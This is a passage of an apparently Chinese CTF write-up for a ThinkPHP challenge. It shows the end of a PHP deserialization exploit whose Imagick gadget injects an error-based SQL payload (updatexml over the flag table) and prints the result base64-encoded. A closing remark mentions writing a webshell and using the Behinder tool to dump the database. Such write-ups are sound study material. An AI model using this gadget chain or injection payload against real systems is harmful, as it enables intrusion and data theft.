+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// flag{fafdd279-cacb-4684-b918-7a23f3164d55}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="s2">&#34;table&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;mysql.user where updatexml(1,concat(0x7e,mid((select`*`from`flag`),30),0x7e),1)#&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;where&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;1=1&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>        
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>    
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="p">{</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Think\Image\Driver\Imagick</span><span class="p">()));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>除了报错注入，<a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp" target="_blank" rel="noopener">赵总</a>直接写shell，使用冰蝎连数据库导出数据库内容似乎更快一点</p>
 
